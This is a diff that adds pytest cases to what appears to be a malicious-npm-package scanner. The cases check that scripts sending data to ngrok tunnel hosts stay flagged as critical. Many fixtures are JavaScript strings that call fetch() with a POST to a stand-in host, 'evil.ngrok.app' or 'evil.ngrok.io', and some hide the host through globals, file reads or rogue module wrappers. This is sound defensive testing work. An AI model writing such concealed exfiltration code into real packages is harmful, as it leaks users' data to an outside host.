@@ -284,3 +284,94 @@ def test_enclosing_object_member_access_stays_low():
             "const server = {\n  port: 5173,\n  allowedHosts: options.allowedHosts ?? [\n"
             "    \".ngrok.io\",\n  ],\n};\nif (server.port === 0) log('random port');\n")
     assert _sevs(code, "dist/x.js") == ["low"]
+
+
+# --- second review round of #379 ---------------------------------------------------
+
+_BIG = _FILLER[:100] + ["*.ck", "!www.ck"] + _FILLER[100:220] + ["evil.ngrok.io"]
+_BIG_BODY = "".join(f'  "{h}",\n' for h in _BIG)
+_FIND = "fetch('https://' + lists().find((h) => h.startsWith('evil'))" + _POST
+
+
+@pytest.mark.parametrize("code", [
+    # code on the list's closing line, or on the literal's own line
+    _KEY + "function lists() {\n  const PSL = [\n" + _BIG_BODY + "  ]; return PSL;\n}\n" + _FIND,
+    _KEY + "const PSL = [\n" + _BIG_BODY + "], Q = PSL;\nconst lists = () => Q;\n" + _FIND,
+    _KEY + "const o = { placeholder: 'evil.ngrok.app' }, h = o.placeholder;\n"
+    "fetch('https://' + h" + _POST,
+    # handed to this package's own function / method / constructor, or an expression
+    _KEY + "show({ placeholder: 'evil.ngrok.app' });\n"
+    "function show(o) { fetch('https://' + Object.values(o)[0]" + _POST.rstrip(";\n") + "; }\n",
+    _KEY + "const ui = { text: (o) => fetch('https://' + Object.values(o)[0]"
+    + _POST.rstrip(";\n") + ") };\nui.text({\n  placeholder: 'evil.ngrok.app',\n});\n",
+    _KEY + "new Wiz({\n  placeholder: 'evil.ngrok.app',\n});\n"
+    "function Wiz(o) { fetch('https://' + Object.values(o)[0]" + _POST.rstrip(";\n") + "; }\n",
+    _KEY + "(0, show)({\n  placeholder: 'evil.ngrok.app',\n});\n",
+    # a key on the path, an array method, a global, an exported alias
+    _KEY + "const all = {\n  ui: {\n    placeholder: 'evil.ngrok.app',\n  },\n};\n"
+    "const vs = Object.values(all.ui);\nfetch('https://' + vs[0]" + _POST,
+    _KEY + "const steps = [\n  {\n    placeholder: 'evil.ngrok.app',\n  },\n];\n"
+    "steps.forEach((s) => send(s));\n",
+    "globalThis.cfg = {\n  placeholder: 'evil.ngrok.app',\n};\n",
+    "Object.assign(globalThis, {\n  cfg: {\n    placeholder: 'evil.ngrok.app',\n  },\n});\n",
+    "const o = {\n  placeholder: 'evil.ngrok.app',\n};\nexport const x = o;\n",
+    # a function whose source is read
+    _KEY + "function cfg() {\n  const o = { placeholder: 'evil.ngrok.app' };\n}\n"
+    "const h = cfg.toString().match(/[a-z]+[.]ngrok[.]app/)[0];\nfetch('https://' + h" + _POST,
+])
+def test_tunnel_data_second_round_stays_critical(code):
+    assert "critical" in _sevs(code, "dist/x.js"), code
+
+
+def test_tunnel_data_only_relaxed_in_js_code():
+    assert _sevs('{"placeholder": "evil.ngrok.app"}\n', "hosts.json") == ["critical"]
+    assert _sevs("placeholder = 'evil.ngrok.app'\n", "opts.py") == ["critical"]
+
+
+def test_cjs_wrapper_must_be_esbuild_canonical():
+    body = "\tmodule.exports = [\n" + "".join(f'\t\t"{h}",\n' for h in _BIG) + "\t];\n} });\n"
+    head = ('var require_rules = __commonJS({ "node_modules/psl/data/rules.json"'
+            '(exports, module) {\n')
+    canon = ("var __commonJS = (cb, mod) => function __require() {\n  return mod || "
+             "(0, cb[__getOwnPropNames(cb)[0]])((mod = { exports: {} }).exports, mod), "
+             "mod.exports;\n};\n")
+    rogue = ("function __commonJS(cb) { const m = { exports: {} }; "
+             "cb[Object.keys(cb)[0]]({}, m); return m; }\n")
+    send = "function send(u, d) { return fetch(u, {method: 'POST', body: d}); }\n"
+    assert _sevs(canon + head + body + send, "dist/bundle.js") == ["low"]
+    assert _sevs(rogue + head + body + send, "dist/bundle.js") == ["critical"]
+
+
+def _restored(texts: dict[str, str], path: str) -> list[str]:
+    from src.scanner import npm_scripts
+
+    findings, _, _ = _scan_content(texts[path], path)
+    npm_scripts.restore_tunnel_data(findings, texts)
+    return [f.severity for f in findings if f.name == EXFIL]
+
+
+_OPTS = "import { ui } from 'clack';\nconst o = {\n  placeholder: 'evil.ngrok.app',\n};\n"
+
+
+@pytest.mark.parametrize("other,sev", [
+    ("const v = require('fs').readFileSync(require('path').join(__dirname, 'package.json'));\n",
+     "low"),
+    ("const v = require('fs').readFileSync('config.json', 'utf8');\n", "low"),
+    ("const t = require('fs').readFileSync(require.resolve('./opts'), 'utf8');\n", "critical"),
+    ("const t = require('fs').readFileSync(p, 'utf8');\n", "critical"),
+    ("const t = require('fs').readFileSync(dir + '/x.json', 'utf8');\n", "critical"),
+    ("import raw from './opts.js?raw';\n", "critical"),
+    ("fetch(new URL('./opts.js', import.meta.url)).then((r) => r.text());\n", "critical"),
+])
+def test_file_whose_text_is_read_is_restored(other, sev):
+    texts = {"dist/opts.js": _OPTS, "dist/cli.js": other}
+    assert _restored(texts, "dist/opts.js") == [sev]
+
+
+def test_classic_script_global_named_elsewhere_is_restored():
+    opts = "var cfg = {\n  placeholder: 'evil.ngrok.app',\n};\nif (cfg === x) go();\n"
+    assert _restored({"a.js": opts, "b.js": "go(1);\n"}, "a.js") == ["low"]
+    assert _restored({"a.js": opts, "b.js": "go(cfg);\n"}, "a.js") == ["critical"]
+    # a module's top-level const is not global
+    mod = "import x from 'y';\n" + opts.replace("var cfg", "const cfg")
+    assert _restored({"a.js": mod, "b.js": "go(cfg);\n"}, "a.js") == ["low"]
